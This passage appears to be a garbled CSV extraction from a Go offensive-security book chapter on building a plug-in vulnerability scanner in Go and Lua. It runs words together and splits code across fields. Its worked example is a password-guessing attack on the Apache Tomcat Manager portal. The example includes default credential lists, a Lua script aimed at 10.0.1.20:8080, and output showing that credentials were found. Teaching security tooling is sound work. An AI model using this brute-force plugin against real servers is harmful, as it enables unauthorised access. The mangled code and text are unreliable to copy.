Thefilecalled,NA,NA
cmd/scanner/main.go,NA,NA
isyourcommandline ,NA,NA
utility.Itwillloadtheplug-insandinitiateascan.The,NA,NA
plugins ,NA,NA
directorywillcontainallthesharedobjectsthatyou’llload ,NA,NA
dynamicallytocallvariousvulnerabilitysignaturechecks. ,NA,NA
You’llusethefilecalled,NA,NA
scanner/scanner.go,NA,NA
todefinethedata ,NA,NA
typesyourplug-insandmainscannerwilluse.Youputthis ,NA,NA
dataintoitsownpackagetomakeitalittlebiteasiertouse.,NA,NA
Listing10-1,NA,NA
showswhatyour,NA,NA
scanner.go,NA,NA
filelookslike. ,NA,NA
(Allthecodelistingsattherootlocationof/existunderthe ,NA,NA
providedgithubrepo,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/,NA,NA
.),"packagescanner
  
  
 //Scannerdefinesaninterfacetowhichallchecksadhere❶t
 ypeCheckerinterface{
  
  
 ❷Check(
 hoststring
 ,
 portuint64
 )*Result 
  
 }",NA
"Inthispackage,named",scanner,NA
",youdefinetwotypes.The ",NA,NA
firstisaninterfacecalled,Checker,NA
❶.Theinterfacedefinesa ,NA,NA
singlemethodnamed,Check(),NA
"❷,whichacceptsahostandport ",NA,NA
valueandreturnsapointertoa,Result,NA
.Your,Result,NA
typeis ,NA,NA
definedasa,struct,NA
❸.Itspurposeistotracktheoutcomeofthe ,NA,NA
check.Istheservicevulnerable?Whatdetailsarepertinentin ,NA,NA
"documenting,validating,orexploitingtheflaw?",NA,NA
You’lltreattheinterfaceasacontractorblueprintofsorts; ,NA,NA
aplug-inisfreetoimplementthe,Check(),NA
functionhoweverit,NA,NA
"chooses,solongasitreturnsapointertoa",Result,NA
.Thelogicof,NA,NA
theplug-in’simplementationwillvarybasedoneachplug-in’s ,NA,NA
"vulnerability-checkinglogic.Forinstance,aplug-inchecking ",NA,NA
foraJavadeserializationissuecanimplementtheproper ,NA,NA
"HTTPcalls,whereasaplug-incheckingfordefaultSSH ",NA,NA
credentialscanissueapassword-guessingattackagainstthe ,NA,NA
SSHservice.Thepowerofabstraction!,NA,NA
"Next,let’sreview",NA,NA
cmd/scanner/main.go,NA,NA
",whichwill ",NA,NA
consumeyourplug-ins(,NA,NA
Listing10-2,NA,NA
).,"constPluginsDir=""../../plugins/""❶
  
  
 funcmain(){
  
 var( 
  
 files[]os.FileInfo 
  
 errerror 
  
 p*plugin.Plugin 
  
 nplugin.Symbol
  
 checkscanner.Checker",NA
Thecodestartsbydefiningthelocationofyourplug-,NA,NA
"ins❶.Inthiscase,you’vehardcodedit;youcouldcertainly ",NA,NA
improvethecodesoitreadsthisvalueinasanargumentor ,NA,NA
environmentvariableinstead.Youusethisvariabletocall ,ioutil.ReadDir(PluginDir),NA
"andobtainafilelisting❷,andthenloop",NA,NA
"overeachoftheseplug-infiles❸.Foreachfile,youuseGo’s ",plugin,NA
packagetoreadtheplug-inviaacallto,plugin.Open(),NA
❹.If ,NA,NA
"thissucceeds,you’regivena",*plugin.Plugin,NA
"instance,whichyou",NA,NA
assigntothevariablenamed,p,NA
.Youcall,"p.Lookup(""New"")",NA
to ,NA,NA
searchyourplug-inforasymbolnamed,New,NA
❺.,NA,NA
"Aswementionedduringthehigh-leveloverviewearlier, ",NA,NA
thissymbollookupconventionrequiresyourmainprogramto ,NA,NA
"providetheexplicitnameofthesymbolasanargument, ",NA,NA
meaningyouexpecttheplug-intohaveanexportedsymbolby ,NA,NA
"thesamename—inthiscase,ourmainprogramislookingfor ",NA,NA
thesymbolnamed,New,NA
".Furthermore,asyou’llseeshortly,the",NA,NA
codeexpectsthesymboltobeafunctionthatwillreturna ,NA,NA
concreteimplementationofyour,scanner.Checker,NA
"interface,whic",NA,NA
h,NA,NA
wediscussedintheprevioussection.,NA,NA
Assumingyourplug-incontainsasymbolnamed,New,NA
",you",NA,NA
makeatypeassertionforthesymbolasyoutrytoconvertitto ,NA,NA
type,func()scanner.Checker,NA
"❻.Thatis,you’reexpectingthe ",NA,NA
symboltobeafunctionthatreturnsanobjectimplementing ,scanner.Checker,NA
.Youassigntheconvertedvaluetoavariable,NA,NA
named,newFunc,NA
.Thenyouinvokeitandassignthereturned ,NA,NA
valuetoavariablenamed,check,NA
❼.Thankstoyourtype ,NA,NA
"assertion,youknowthat",check,NA
satisfiesyour,scanner.Checker,NA
"interface,soitmustimplementa",Check(),NA
"function.Youcallit, ",NA,NA
"passinginatargethostandport❽.Theresult,a",*scanner.Result,NA
", ",NA,NA
iscapturedusingavariablenamed,res,NA
andinspectedto ,NA,NA
determinewhethertheservicewasvulnerableornot❾.,NA,NA
Noticethatthisprocessisgeneric;itusestypeassertions ,NA,NA
andinterfacestocreateaconstructthroughwhichyoucan ,NA,NA
dynamicallycallplug-ins.Nothingwithinthecodeisspecific,NA,NA
toasinglevulnerabilitysignatureormethodusedtocheckfor ,NA,NA
"avulnerability’sexistence.Instead,you’veabstractedthe ",NA,NA
functionalityenoughthatplug-indeveloperscancreatestand-,NA,NA
aloneplug-insthatperformunitsofworkwithouthaving ,NA,NA
knowledgeofotherplug-ins—orevenextensiveknowledgeof ,NA,NA
theconsumingapplication.Theonlythingthatplug-inauthors ,NA,NA
mustconcernthemselveswithisproperlycreatingthe ,NA,NA
exported,New(),NA
functionandatypethatimplements,scanner.Checker,NA
.Let’shavealookataplug-inthatdoesjustthat.,NA,NA
BuildingaPassword-GuessingPlug-in,NA,NA
Thisplug-in(,NA,NA
Listing10-3,NA,NA
)performsapassword-guessing ,NA,NA
attackagainsttheApacheTomcatManagerloginportal.A ,NA,NA
"favoritetargetforattackers,theportaliscommonlyconfigure",NA,NA
d ,NA,NA
"toaccepteasilyguessablecredentials.Withvalidcredentials, ",NA,NA
anattackercanreliablyexecutearbitrarycodeonthe ,NA,NA
underlyingsystem.It’saneasywinforattackers.,NA,NA
"Inourreviewofthecode,wewon’tcoverthespecific ",NA,NA
"detailsofthevulnerabilitytest,asit’sreallyjustaseriesof ",NA,NA
"HTTPrequestsissuedtoaspecificURL.Instead,we’llfocus ",NA,NA
primarilyonsatisfyingthepluggablescanner’sinterface ,NA,NA
requirements.,"import(
  
  
 //Somesnippedforbrevity 
  
 ""github.com/bhg/ch-10/plugin-
 core/scanner""❶)
  
  
 varUsers=[]string{""admin"",""manager"",""tomcat""}
  
  
 varPasswords=[]string{""admin"",""manager"",""tomcat"",""password""}
  
  
 //TomcatCheckerimplementsthescanner.Checkinterface.Usedforguessing
  
  
 Tomcatcreds",NA
"First,youneedtoimportthe",scanner,NA
packagewedetailed ,NA,NA
previously❶.Thispackagedefinesboththe,Checker,NA
interface ,NA,NA
andthe,Result,NA
structthatyou’llbebuilding.Tocreatean,NA,NA
implementationof,Checker,NA
",youstartbydefininganempty",struct,NA
typenamed,TomcatChecker,NA
❷.Tofulfillthe,Checker,NA
interface’s ,NA,NA
"implementationrequirements,youcreateamethodmatching ",NA,NA
therequired,"Check(hoststring,portuint64)*scanner.Result",NA
function ,NA,NA
"signature❸.Withinthismethod,youperformallofyour ",NA,NA
customvulnerability-checkinglogic.,NA,NA
Sinceyou’reexpectedtoreturna,*scanner.Result,NA
",you ",NA,NA
"initializeone,assigningittoavariablenamed",res,NA
❹.Ifthe ,NA,NA
"conditionsaremet—thatis,ifthecheckerverifiesthe ",NA,NA
guessablecredentials—,NA,NA
"andthevulnerabilityisconfirmed❺,",NA,NA
youset,res.Vulnerable,NA
to,true,NA
andset,res.Details,NA
toamessage ,NA,NA
containingtheidentifiedcredentials.Ifthevulnerabilityisn’t ,NA,NA
"identified,theinstancereturnedwillhave",res.Vulnerable,NA
settoits ,NA,NA
defaultstate—,false,NA
.,NA,NA
"Lastly,youdefinetherequiredexportedfunction","New() 
 *scanner.Checker",NA
❻.Thisadherestotheexpectationssetbyyour ,NA,NA
scanner’s,Lookup(),NA
"call,aswellasthetypeassertionand ",NA,NA
conversionneededtoinstantiatetheplug-in-defined ,TomcatChecker,NA
.Thisbasicentrypointdoesnothingmorethan ,NA,NA
returnanew,*TomcatChecker,NA
"(which,sinceitimplementsthe ",NA,NA
required,Check(),NA
"method,happenstobea",scanner.Checker,NA
).,NA,NA
RunningtheScanner ,NA,NA
Nowthatyou’vecreatedbothyourplug-inandthemain ,NA,NA
"programthatconsumesit,compileyourplug-in,usingthe",-o,NA
optiontodirectyourcompiledsharedobjecttothescanner’s ,NA,NA
plug-insdirectory:,"$
 gobuild-buildmode=plugin-o/path/to/plugins/tomcat.so",NA
Thenrunyourscanner(,NA,NA
cmd/scanner/main.go,NA,NA
)toconfir,NA,NA
"m thatitidentifiestheplug-in,loadsit,andexecutestheplug-",NA,NA
in’s,Check(),NA
method:,"$
 gorunmain.go
  
  
 Foundplugin:tomcat.so
  
  
 2020/01/1515:45:18CheckingforTomcatManager...
  
  
 2020/01/1515:45:18Hostrespondedto/manager/htmlrequest
  
  
 2020/01/1515:45:18Hostrequiresauthentication.Proceedingwithpassword
  
  
 guessing...
  
  
 2020/01/1515:45:18Hostisvulnerable:Validcredentialsfound-tomcat:tomcat",NA
Wouldyoulookatthat?Itworks!Yourscannerisableto ,NA,NA
callcodewithinyourplug-in.Youcandropanynumberof ,NA,NA
otherplug-insintotheplug-insdirectory.Yourscannerwill ,NA,NA
attempttoreadeachandkickoffthevulnerability-checking ,NA,NA
functionality.,NA,NA
Thecodewedevelopedcouldbenefitfromanumberof ,NA,NA
improvements.We’llleavetheseimprovementstoyouasan ,NA,NA
exercise.Weencourageyoutotryafewthings:,"1.
  Createaplug-intocheckforadifferentvulnerability.
  
 2.
  Addtheabilitytodynamicallysupplyalistofhostsandtheiropenportsfor 
  
 moreextensivetests.
  
 3.
  Enhancethecodetocallonlyapplicableplug-ins.Currently,thecodewillcall 
 allplug-insforthegivenhostandport.Thisisn’tideal.Forexample,you 
 wouldn’twanttocalltheTomcatcheckerifthetargetportisn’tHTTPor HTTPS.
  
 4.
  Convertyourplug-insystemtorunonWindows,usingDLLsastheplug-in 
  
 type.",NA
"Inthenextsection,you’llbuildthesamevulnerability-",NA,NA
"checkingplug-ininadifferent,unofficialplug-insystem:Lua.",NA,NA
BUILDINGPLUG-INSINLUA,NA,NA
UsingGo’snative,buildmode,NA
featurewhencreatingpluggable,NA,NA
"programshaslimitations,particularlybecauseit’snotvery ",NA,NA
"portable,meaningtheplug-insmaynotcross-compilenicely. ",NA,NA
"Inthissection,we’lllookatawaytoovercomethisdeficiency ",NA,NA
bycreatingplug-inswithLuainstead.Luaisascripting ,NA,NA
languageusedtoextendvarioustools.Thelanguageitselfis ,NA,NA
"easilyembeddable,powerful,fast,andwell-documented. ",NA,NA
SecuritytoolssuchasNmapandWiresharkuseitforcreating ,NA,NA
"plug-ins,muchasyou’lldorightnow.Formoreinfo,referto",NA,NA
theofficialsiteat,NA,NA
https://www.lua.org/,NA,NA
.,NA,NA
"TouseLuawithinGo,you’lluseathird-partypackage, ",gopher-lua,NA
",whichiscapableofcompilingandexecutingLua",NA,NA
scriptsdirectlyinGo.Installitonyoursystembyenteringthe ,NA,NA
following:,"$
 gogetgithub.com/yuin/gopher-lua",NA
"Now,beforewarnedthatthepriceyou’llpayforportability",NA,NA
isincreasedcomplexity.That’sbecauseLuahasnoimplicit ,NA,NA
waytocallfunctionsinyourprogramorvariousGopackages ,NA,NA
andhasnoknowledgeofyourdatatypes.Tosolvethis ,NA,NA
"problem,you’llhavetochooseoneoftwodesignpatterns:","1.
  CallasingleentrypointinyourLuaplug-in,andlettheplug-incallanyhelper 
 methods(suchasthoseneededtoissueHTTPrequests)throughotherLua 
 packages.Thismakesyourmainprogramsimple,butitreducesportabilityand 
 couldmakedependencymanagementanightmare.Forexample,whatifaLua 
 plug-inrequiresathird-partydependencynotinstalledasacoreLuapackage?
  
 Yourplug-inwouldbreakthemomentyoumoveittoanothersystem.Also, 
 whatiftwoseparateplug-insrequiredifferentversionsofapackage?
  
 2.
  Inyourmainprogram,wrapthehelperfunctions(suchasthosefromthenet/http 
 package)inamannerthatexposesafaçdethroughwhichtheplug-incan 
 interact.This,ofcourse,requiresyoutowriteextensivecodetoexposeallthe 
 Gofunctionsandtypes.However,onceyou’vewrittenthecode,theplug-inscan 
 reuseitinaconsistentmanner.Plus,youcansortofnotworryabouttheLua 
 dependencyissuesthatyou’dhaveifyouusedthefirstdesignpattern(although, 
 ofcourse,there’salwaysthechancethataplug-inauthorusesathird-party 
 libraryandbreakssomething).",NA
"Fortheremainderofthissection,you’llworkonthe ",NA,NA
seconddesignpattern.You’llwrapyourGofunctionsto ,NA,NA
exposeafaçdethat’saccessibletoyourLuaplug-ins.It’sthe ,NA,NA
"betterofthetwosolutions(andplus,theword",NA,NA
façde,NA,NA
makesit,NA,NA
soundlikeyou’rebuildingsomethingreallyfancy).,NA,NA
"Thebootstrapping,coreGocodethatloadsandrunsplug-",NA,NA
inswillresideinasinglefileforthedurationofthisexercise. ,NA,NA
"Forthesakeofsimplicity,we’vespecificallyremovedsomeof ",NA,NA
patternsusedintheexamplesat ,NA,NA
https://github.com/yuin/gopher-lua/,NA,NA
.Wefeltthatsomeofthe ,NA,NA
"patterns,suchasusinguser-definedtypes,madethecodeless ",NA,NA
"readable.Inarealimplementation,you’dlikelywantto ",NA,NA
includesomeofthosepatternsforbetterflexibility.You’dalso ,NA,NA
wanttoincludemoreextensiveerrorandtypechecking.,NA,NA
YourmainprogramwilldefinefunctionstoissueGETand ,NA,NA
"HEADHTTPrequests,registerthosefunctionswiththeLua ",NA,NA
"virtualmachine(VM),andloadandexecuteyourLuascripts ",NA,NA
fromadefinedplug-insdirectory.You’llbuildthesame ,NA,NA
"Tomcatpassword-guessingplug-infromtheprevioussection, ",NA,NA
soyou’llbeabletocomparethetwoversions.,NA,NA
Creatingthehead()HTTPFunction,NA,NA
"Let’sstartwiththemainprogram.First,let’slookatthe",head(),NA
"HTTPfunction,whichwrapscallstoGo’s",net/http,NA
package,NA,NA
(,NA,NA
Listing10-4,NA,NA
).,"funchead(l*lua.LState❶)int{ 
  
 var(
  
 hoststring 
  
 portuint64 
  
 pathstring 
  
 resp*http.Response 
  
 errerror 
  
 urlstring
  
 )
  
 ❷host=l.CheckString(1) 
  
 port=uint64(l.CheckInt64(2))
  
 path=l.CheckString(3)
  
 url=fmt.Sprintf(""http://%s:%d/%s"",host,port,path)",NA
"First,noticethatyour",head(),NA
functionacceptsapointertoa ,lua.LState,NA
objectandreturnsan,int,NA
❶.Thisistheexpected ,NA,NA
signatureforanyfunctionyouwishtoregisterwiththeLua ,NA,NA
VM.The,lua.LState,NA
"typemaintainstherunningstateoftheVM,",NA,NA
includinganyparameterspassedintoLuaandreturnedfrom ,NA,NA
"Go,asyou’llseeshortly.Sinceyourreturnvalueswillbe ",NA,NA
includedwithinthe,lua.LState,NA
"instance,the",int,NA
returntype,NA,NA
"representsthenumberofvaluesreturned.Thatway,yourLua ",NA,NA
plug-inwillbeabletoreadandusethereturnvalues.,NA,NA
Sincethe,lua.LState,NA
"object,",l,NA
",containsanyparameterspassed",NA,NA
"toyourfunction,youreadthedatainviacallsto",l.CheckString(),NA
and,l.CheckInt64(),NA
"❷.(Althoughnotneededforourexample, ",NA,NA
other,Check*,NA
functionsexisttoaccommodateotherexpected,NA,NA
"datatypes.)Thesefunctionsreceiveanintegervalue,which ",NA,NA
"actsastheindexforthedesiredparameter.UnlikeGoslices, ",NA,NA
"whichare0-indexed,Luais1-indexed.So,thecallto ",l.CheckString(1),NA
retrievesthefirstparametersuppliedintheLua,NA,NA
"functioncall,expectingittobeastring.Youdothisforeach ",NA,NA
"ofyourexpectedparameters,passingintheproperindexofthe",NA,NA
expectedvalue.Foryour,head(),NA
"function,you’reexpectingLua",NA,NA
tocall,"head(host,port,path)",NA
",where",host,NA
and,path,NA
arestringsand,port,NA
"isaninteger.Inamoreresilientimplementation,you’dwant ",NA,NA
todoadditionalcheckingheretomakesurethedatasupplied ,NA,NA
isvalid.,NA,NA
ThefunctionproceedstoissueanHTTPHEADrequest ,NA,NA
andperformsomeerrorchecking.Inordertoreturnvaluesto ,NA,NA
"yourLuacallers,youpushthevaluesontoyour",lua.LState,NA
by,NA,NA
calling,l.Push(),NA
andpassingitanobjectthatfulfillsthe,lua.LValue,NA
interfacetype❸.The,gopher-lua,NA
packagecontainsseveraltypes ,NA,NA
"thatimplementthisinterface,makingitaseasyascalling ",lua.LNumber(0),NA
and,lua.LBool(false),NA
",forexample,tocreatenumerical",NA,NA
andbooleanreturntypes.,NA,NA
"Inthisexample,you’rereturningthreevalues.Thefirstis ",NA,NA
"theHTTPstatuscode,theseconddetermineswhetherthe ",NA,NA
"serverrequiresbasicauthentication,andthethirdisanerror ",NA,NA
message.We’vechosentosetthestatuscodeto,0,NA
ifanerror,NA,NA
occurs.Youthenreturn,3,NA
",whichisthenumberofitemsyou’ve ",NA,NA
pushedontoyour,LState,NA
instance❹.Ifyourcallto,http.Head(),NA
"doesn’tproduceanerror,youpushyourreturnvaluesonto ",LState,NA
"❺,thistimewithavalidstatuscode,andthencheckfor ",NA,NA
basicauthenticationandreturn,3,NA
❻.,NA,NA
Creatingtheget()Function,NA,NA
"Next,you’llcreateyour",get(),NA
"function,which,liketheprevious",NA,NA
"example,wrapsthe",net/http,NA
"package’sfunctionality.Inthiscase,",NA,NA
"however,you’llissueanHTTPGETrequest.Otherthanthat, ",NA,NA
the,get(),NA
functionusesfairlysimilarconstructsasyour,head(),NA
functionbyissuinganHTTPrequesttoyourtargetendpoint.,NA,NA
Enterthecodein,NA,NA
Listing10-5,NA,NA
.,"funcget(l*lua.LState)int{
  
 var( 
  
 hoststring 
  
 portuint64 
  
 usernamestring 
  
 passwordstring 
  
 pathstring 
  
 resp*http.Response 
  
 errerror 
  
 urlstring 
  
 client*http.Client 
  
 req*http.Request 
  
 ) 
  
 host=l.CheckString(1) 
  
 port=uint64(l.CheckInt64(2))
  
 ❶username=l.CheckString(3) 
  
 password=l.CheckString(4) 
  
 path=l.CheckString(5) 
  
 url=fmt.Sprintf(""http://%s:%d/%s"",host,port,path) 
  
 client=new(http.Client) 
  
 ifreq,err=http.NewRequest(""GET"",url,nil);err!=nil{ 
  
 l.Push(lua.LNumber(0)) 
  
 l.Push(lua.LBool(false)) 
  
 l.Push(lua.LString(fmt.Sprintf(""UnabletobuildGETrequest:%s"",err))) 
 return3 
  
 } 
  
 ifusername!=""""||password!=""""{ 
  
 //AssumeBasicAuthisrequiredsinceuserand/orpasswordisset 
 req.SetBasicAuth(username,password) 
  
 } 
  
 ifresp,err=client.Do(req);err!=nil{ 
  
 l.Push(lua.LNumber(0)) 
  
 l.Push(lua.LBool(false)) 
  
 l.Push(lua.LString(fmt.Sprintf(""UnabletosendGETrequest:%s"",err))) 
 return3 
  
 } 
  
 l.Push(lua.LNumber(resp.StatusCode))
  
 l.Push(lua.LBool(false))",NA
Muchlikeyour,head(),NA
"implementation,your",get(),NA
function,NA,NA
"willreturnthreevalues:thestatuscode,avalueexpressing ",NA,NA
whetherthesystemyou’retryingtoaccessrequiresbasic ,NA,NA
"authentication,andanyerrormessages.Theonlyreal ",NA,NA
differencebetweenthetwofunctionsisthatyour,get(),NA
function,NA,NA
acceptstwoadditionalstringparameters:ausernameanda ,NA,NA
password❶.Ifeitherofthesevaluesissettoanon-empty ,NA,NA
"string,you’llassumeyouhavetoperformbasicauthentication.",NA,NA
"Now,someofyouareprobablythinkingthatthe ",NA,NA
"implementationsareoddlyspecific,almosttothepointof ",NA,NA
"negatinganyflexibility,reusability,andportabilityofaplug-",NA,NA
insystem.It’salmostasifthesefunctionsweredesignedfora ,NA,NA
"veryspecificusecase—thatis,tocheckforbasic ",NA,NA
"authentication—ratherthanforageneralpurpose.Afterall, ",NA,NA
whywouldn’tyoureturntheresponsebodyortheHTTP ,NA,NA
"headers?Likewise,whywouldn’tyouacceptmorerobust ",NA,NA
"parameterstosetcookies,otherHTTPheaders,orissuePOST ",NA,NA
"requestswithabody,forexample?",NA,NA
Simplicity,NA,NA
istheanswer.Yourimplementationscanactasa ,NA,NA
"startingpointforbuildingamorerobustsolution.However, ",NA,NA
"creatingthatsolutionwouldbeamoresignificantendeavor, ",NA,NA
andyou’dlikelylosethecode’spurposewhiletryingto ,NA,NA
"navigateimplementationdetails.Instead,we’vechosentodo ",NA,NA
"thingsinamorebasic,lessflexiblefashiontomakethe ",NA,NA
"general,foundationalconceptssimplertounderstand.An",NA,NA
improvedimplementationwouldlikelyexposecomplexuser-,NA,NA
"definedtypesthatbetterrepresenttheentiretyof,forexample, ",NA,NA
the,http.Request,NA
and,http.Response,NA
"types.Then,ratherthanacceptin",NA,NA
g,NA,NA
"andreturningmultipleparametersfromLua,youcould ",NA,NA
"simplifyyourfunctionsignatures,reducingthenumberof ",NA,NA
parametersyouacceptandreturn.Weencourageyoutowork ,NA,NA
"throughthischallengeasanexercise,changingthecodeto ",NA,NA
acceptandreturnuser-defined,structs,NA
ratherthanprimitive,NA,NA
types.,NA,NA
RegisteringtheFunctionswiththeLuaVM,NA,NA
"Uptothispoint,you’veimplementedwrapperfunctions ",NA,NA
aroundthenecessary,net/http,NA
"callsyouintendtouse,creating",NA,NA
thefunctionsso,gopher-lua,NA
"canconsumethem.However,you",NA,NA
needtoactuallyregisterthefunctionswiththeLuaVM.The ,NA,NA
functionin,NA,NA
Listing10-6,NA,NA
centralizesthisregistrationprocess.,"❶constLuaHttpTypeName=""http""
  
  
 funcregister(l*lua.LState){
  
  
 ❷mt:=l.NewTypeMetatable(LuaHttpTypeName
 )
  
 ❸l.SetGlobal(""http"",mt) 
  
 //staticattributes
  
  
 ❹l.SetField(mt,""head"",l.NewFunction(head)) 
 l.SetField(mt,""get"",l.NewFunction(get))
  
  
 }
  
 Listing10-6:Registeringplug-inswithLua(
 /ch-10/lua-core/cmd/scanner/main.go
 )",NA
Youstartbydefiningaconstantthatwilluniquelyidentify ,NA,NA
"thenamespaceyou’recreatinginLua❶.Inthiscase,you’ll ",NA,NA
use,http,NA
becausethat’sessentiallythefunctionalityyou’re,NA,NA
exposing.Inyour,register(),NA
"function,youacceptapointertoa",NA,NA
",andusethatnamespaceconstanttocreateanewLua ",NA,NA
typeviaacallto,l.NewTypeMetatable(),NA
❷.You’llusethis ,NA,NA
metatabletotracktypesandfunctionsavailabletoLua.,NA,NA
"Youthenregisteraglobalname,",http,NA
",onthemetatable❸. ",NA,NA
Thismakesthe,http,NA
implicitpackagenameavailabletotheLua ,NA,NA
"VM.Onthesamemetatable,youalsoregistertwofieldsby ",NA,NA
usingcallsto,l.SetField(),NA
"❹.Here,youdefinetwostatic ",NA,NA
functionsnamed,head(),NA
and,get(),NA
",availableonthe",http,NA
"namespace.Sincethey’restatic,youcancallthemvia",http.get(),NA
and,http.head(),NA
withouthavingtocreateaninstanceoftype,http,NA
in ,NA,NA
Lua.,NA,NA
Asyoumayhavenotedinthe,SetField(),NA
"calls,thethird ",NA,NA
parameteristhedestinationfunctionthat’llhandletheLua ,NA,NA
"calls.Inthiscase,thoseareyour",get(),NA
and,head(),NA
functionsyou ,NA,NA
previouslyimplemented.Thesearewrappedinacallto ,l.NewFunction(),NA
",whichacceptsafunctionofform",func(*LState)int,NA
", ",NA,NA
whichishowyoudefinedyour,get(),NA
and,head(),NA
functions.They ,NA,NA
returna,*lua.LFunction,NA
".Thismightbealittleoverwhelming, ",NA,NA
sincewe’veintroducedalotofdatatypesandyou’reprobably ,NA,NA
unfamiliarwith,gopher-lua,NA
.Justunderstandthatthisfunctionis ,NA,NA
registeringtheglobalnamespaceandfunctionnamesand ,NA,NA
creatingmappingsbetweenthosefunctionnamesandyourGo ,NA,NA
functions.,NA,NA
WritingYourMainFunction ,NA,NA
"Lastly,you’llneedtocreateyour",main(),NA
"function,whichwill ",NA,NA
coordinatethisregistrationprocessandexecutetheplug-in ,NA,NA
(,NA,NA
Listing10-7,NA,NA
).,NA,NA
Asyoudidforyour,main(),NA
"functionintheGoexample,",NA,NA
you’llhardcodethedirectorylocationfromwhichyou’llload ,NA,NA
yourplug-ins❶.Inyour,main(),NA
"function,youissueacallto ",lua.NewState(),NA
❷tocreateanew,*lua.LState,NA
instance.The ,lua.NewState(),NA
instanceisthekeyitemyou’llneedtosetupyour,NA,NA
"LuaVM,registeryourfunctionsandtypes,andexecute",NA,NA
arbitraryLuascripts.Youthenpassthatpointertothe,register(),NA
"functionyoucreatedearlier❸,whichregistersyourcustom ",http,NA
namespaceandfunctionsonthestate.Youreadthe ,NA,NA
"contentsofyourplug-insdirectory❹,loopingthrougheach",NA,NA
"fileinthedirectory❺.Foreachfile,youcall",l.DoFile(f),NA
"❻, ",NA,NA
where,f,NA
istheabsolutepathtothefile.Thiscallexecutesthe,NA,NA
contentsofthefilewithintheLuastateonwhichyou ,NA,NA
"registeredyourcustomtypesandfunctions.Basically,",DoFile(),NA
is,gopher-lua,NA
’swayofallowingyoutoexecuteentirefilesasif,NA,NA
theywerestand-aloneLuascripts.,NA,NA
CreatingYourPlug-inScript,NA,NA
"Nowlet’stakealookatyourTomcatplug-inscript,writtenin ",NA,NA
Lua(,NA,NA
Listing10-8,NA,NA
).,"usernames={""admin"",""manager"",""tomcat""}
  
 passwords={""admin"",""manager"",""tomcat"",""password""}
  
 status,basic,err=http.head(""10.0.1.20"",8080,""/manager/html"")
 ❶iferr~=""""then
  
 print(""[!]Error:""..err) 
  
 return 
  
 end 
  
 ifstatus~=401ornotbasicthen 
  
 print(""[!]Error:EndpointdoesnotrequireBasicAuth.Exiting."") 
  
 return 
  
 end 
  
 print(""[+]EndpointrequiresBasicAuth.Proceedingwithpasswordguessing""
 ) fori,usernameinipairs(usernames)do 
  
 forj,passwordinipairs(passwords)do
  
 status,basic,err=http.get(""10.0.1.20"",8080,username,password, 
 ""/manager/html"")❷
  
 ifstatus==200then
  
 print(""[+]Foundcreds-""..username.."":""..password) return 
  
 end 
  
 end
  
 end
  
 Listing10-8:ALuaplug-inforTomcatpasswordguessing(
 /ch-10/lua-
 core/plugins/tomcat.lua
 )",NA
Don’tworrytoomuchaboutthevulnerability-checking ,NA,NA
logic.It’sessentiallythesameasthelogicyoucreatedinthe ,NA,NA
Goversionofthisplug-in;itperformsbasicpassword ,NA,NA
guessingagainsttheTomcatManagerportalafterit ,NA,NA
fingerprintstheapplicationbyusingaHEADrequest.We’ve ,NA,NA
highlightedthetwomostinterestingitems.,NA,NA
Thefirstisacallto,"http.head(""10.0.1.20"",8080,""/manager/html"")",NA
❶.,NA,NA
Basedoffyourglobalandfieldregistrationsonthestate ,NA,NA
"metatable,youcanissueacalltoafunctionnamed",http.head(),NA
"withoutreceivingaLuaerror.Additionally,you’resupplying ",NA,NA
thecallwiththethreeparametersyour,head(),NA
functionexpected,NA,NA
toreadfromthe,LState,NA
instance.TheLuacallisexpectingthree,NA,NA
"returnvalues,whichalignwiththenumbersandtypesyou ",NA,NA
pushedontothe,LState,NA
beforeyouexitedtheGofunction. ,NA,NA
Theseconditemisyourcallto,http.get(),NA
"❷,whichissimilar ",NA,NA
tothe,http.head(),NA
functioncall.Theonlyrealdifferenceisthat,NA,NA
youarepassingusernameandpasswordparameterstothe ,http.get(),NA
function.IfyoureferbacktotheGoimplementationof,NA,NA
your,get(),NA
"function,you’llseethatwe’rereadingthesetwo",NA,NA
additionalstringsfromthe,LState,NA
instance.,NA,NA
TestingtheLuaPlug-in,NA,NA
Thisexampleisn’tperfectandcouldbenefitfromadditional ,NA,NA
"designconsiderations.Butaswithmostadversarialtools,the ",NA,NA
mostimportantthingisthatitworksandsolvesaproblem.,NA,NA
"Runningyourcodeprovesthatitdoes,indeed,workas ",NA,NA
expected:,"$
 gorunmain.go
  
  
 Foundplugin:tomcat.lua
  
  
 [+]EndpointrequiresBasicAuth.Proceedingwithpasswordguessing",NA
"Nowthatyouhaveabasicworkingexample,weencourage ",NA,NA
youtoimprovethedesignbyimplementinguser-definedtypes ,NA,NA
sothatyouaren’tpassinglengthylistsofargumentsand ,NA,NA
"parameterstoandfromfunctions.Withthis,you’lllikelyneed ",NA,NA
"toexploreregisteringinstancemethodsonyourstruct,wheth",NA,NA
er forsettingandgettingvaluesinLuaorforcallingmethodson ,NA,NA
aspecificallyimplementedinstance.Asyouworkthrough ,NA,NA
"this,you’llnoticethatyourcodewillgetsignificantlymore ",NA,NA
"complex,sinceyou’llbewrappingalotofyourGo ",NA,NA
functionalityinaLua-friendlymanner.,NA,NA
SUMMARY,NA,NA
"Aswithmanydesigndecisions,therearemultiplewaystoskin ",NA,NA
acat.Whetheryou’reusingGo’snativeplug-insystemoran ,NA,NA
"alternativelanguagelikeLua,youmustconsidertrade-offs. ",NA,NA
"Butregardlessofyourapproach,youcaneasilyextendGoto ",NA,NA
"makerichsecurityframeworks,particularlysincetheaddition ",NA,NA
ofitsnativeplug-insystem.,NA,NA
"Inthenextchapter,you’lltackletherichtopicof ",NA,NA
cryptography.We’lldemonstratevariousimplementationsa,NA,NA
"nd usecases,andthenbuildanRC2symmetric-keybrute-",NA,NA
forcer.,NA,NA
11 ,NA,NA
IMPLEMENTINGANDATTACKING ,NA,NA
CRYPTOGRAPHY,NA,NA
Aconversationaboutsecurityisn’tcompletewithout ,NA,NA
exploring,NA,NA
cryptography,NA,NA
.Whenorganizationsuse ,NA,NA
"cryptographicpractices,theycanhelpconservetheintegrity, ",NA,NA
"confidentiality,andauthenticityoftheirinformationand ",NA,NA
"systemsalike.Asatooldeveloper,you’dlikelyneedto ",NA,NA
"implementcryptographicfeatures,perhapsforSSL/TLS ",NA,NA
"communications,mutualauthentication,symmetric-key ",NA,NA
"cryptography,orpasswordhashing.Butdevelopersoften ",NA,NA
"implementcryptographicfunctionsinsecurely,whichmeans ",NA,NA
theoffensive-mindedcanexploittheseweaknessesto ,NA,NA
